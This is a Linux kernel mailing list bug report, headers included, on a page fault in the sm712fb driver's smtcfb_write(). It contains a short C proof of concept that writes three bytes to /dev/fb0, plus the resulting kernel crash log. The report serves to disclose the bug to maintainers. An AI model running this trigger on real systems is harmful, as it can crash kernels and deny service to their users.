Return-Path: <linux-kernel-owner@vger.kernel.org>
X-Original-To: lists+linux-kernel@lfdr.de
Delivered-To: lists+linux-kernel@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 670DF4C55D6
	for <lists+linux-kernel@lfdr.de>; Sat, 26 Feb 2022 13:42:12 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S231612AbiBZMkk (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
        Sat, 26 Feb 2022 07:40:40 -0500
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:48464 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S230085AbiBZMkh (ORCPT
        <rfc822;linux-kernel@vger.kernel.org>);
        Sat, 26 Feb 2022 07:40:37 -0500
Received: from mail-pj1-x102c.google.com (mail-pj1-x102c.google.com [IPv6:2607:f8b0:4864:20::102c])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id D459D1DEABD;
        Sat, 26 Feb 2022 04:40:02 -0800 (PST)
Received: by mail-pj1-x102c.google.com with SMTP id iq13-20020a17090afb4d00b001bc4437df2cso7253249pjb.2;
        Sat, 26 Feb 2022 04:40:02 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=YuRKzy5bovku/y4EtdmzO3tswEC9NnMGJRdh5w4j4uo=;
        b=BuZMddIc1HxfpW2RI1vxH2+Yg4P/UAwzSk07gyuLA/DFysQx9PnVhSPd6bjwqFXlax
         0ksjho++2JtylK+2yZFTBSj3mP9FqF2+5A5wj35pXdoC7HWMTFlbabJjriao5kBf3gXa
         +MZtYgp5WgAuLsmq5Y8k2CDHliYjkmQ1Pd4xDJPbrDV7syTqb+vbH1aNceNrCmr0eL0X
         BXuiCPGM+AhNk8+rdH2FUIoALOiViGZmtPTBCqnxN4r6ESb1r65qfF7KSRTJ5imiKPF2
         WRspPwXCNk1hppKWU1G6b4YZ2OYQfrD7Y23qpXjDxWy2mWdFX3e1Y+poJLM9LgvL1Cx3
         9l6g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=YuRKzy5bovku/y4EtdmzO3tswEC9NnMGJRdh5w4j4uo=;
        b=LVsRLrbiu1rJvJ0/f37bSnBRXoPeY+AjVrS3trM0+MTxOyj3XquBPPYmXcbI+/heM+
         iUBeSZDc7O+fUtXZJXVpTotKN/JHH4b8UTAu6UuSaDyR7+JwVQfBc2qyQnCpxivkqOwb
         KpqyeUUrFDmo5EMDC8EL4bs2hi5bCVY4ZnrOsBLa1JnL4TLZY2pHoPSYt5mdqwkv5KMu
         6v1PDQ75EQ6jtu/iMtbw2p1Z7kIVrOj7IUsCtOEUZGrneuTs/UIi5y7lyZsnG4Gn+5dD
         62JA5Gb8tQ+wJlGgZmEU5C97YU+RebARvLKLe56dOgKOM2hJnHaHjLaUrPmkr0G+v1o3
         C/Rw==
X-Gm-Message-State: AOAM530VqoI6T+xsLv+AGVS23Iwl1Z/tfFaKa/SL8+HYXqYtM/Mhh4sI
        KhnQPlrVY01t1jt99sTr5IxBnHcVNzxVa/wTEQ==
X-Google-Smtp-Source: ABdhPJwbCKBPx6DuSPeqH6k4X0BcBh3xfFXOJBO1dc+vcW3pMhCvj6J/jvfUwNucJlrmv9B0PcpnxtoSFK03D6ttNJE=
X-Received: by 2002:a17:90a:3d0f:b0:1bb:80e9:3b45 with SMTP id
 h15-20020a17090a3d0f00b001bb80e93b45mr7663101pjc.31.1645879202221; Sat, 26
 Feb 2022 04:40:02 -0800 (PST)
MIME-Version: 1.0
From:   Zheyu Ma <zheyuma97@gmail.com>
Date:   Sat, 26 Feb 2022 20:39:51 +0800
Message-ID: <CAMhUBjnAQmqPQEjiTNBnki5Vidnsr0ZFmBSM8pis4+j0=oZpPg@mail.gmail.com>
Subject: [BUG] fbdev: sm712fb: Page fault in smtcfb_write()
To:     sudipm.mukherjee@gmail.com, teddy.wang@siliconmotion.com
Cc:     linux-fbdev@vger.kernel.org, dri-devel@lists.freedesktop.org,
        Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
Content-Type: text/plain; charset="UTF-8"
X-Spam-Status: No, score=-1.9 required=5.0 tests=BAYES_00,DKIM_SIGNED,
        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,FREEMAIL_ENVFROM_END_DIGIT,
        FREEMAIL_FROM,RCVD_IN_DNSWL_NONE,SPF_HELO_NONE,SPF_PASS,
        T_SCC_BODY_TEXT_LINE autolearn=ham autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Hi,

I found a minor in the smtcfb_write() function of the driver sm712fb.
This write function can not handle the case that the size of the
buffer is 3 and does not check for it, which may cause a page fault.

Here is a simple PoC:

#include <endian.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    int fd = open("/dev/fb0", O_RDWR);
    write(fd, "000", 3);

    return 0;
}

The following log reveals it:

[ 1830.917859] BUG: unable to handle page fault for address: ffffc90001ffffff
[ 1830.918481] #PF: supervisor write access in kernel mode
[ 1830.919005] #PF: error_code(0x0002) - not-present page
[ 1830.921941] RIP: 0010:smtcfb_write+0x2c0/0x460
[ 1830.930156] Call Trace:
[ 1830.930364]  <TASK>
[ 1830.930543]  vfs_write+0x291/0xd60
[ 1830.930835]  ? do_sys_openat2+0x27d/0x350
[ 1830.931192]  ? __fget_light+0x54/0x340
[ 1830.931504]  ksys_write+0xce/0x190
[ 1830.931784]  do_syscall_64+0x43/0x90

Regards,
Zheyu Ma
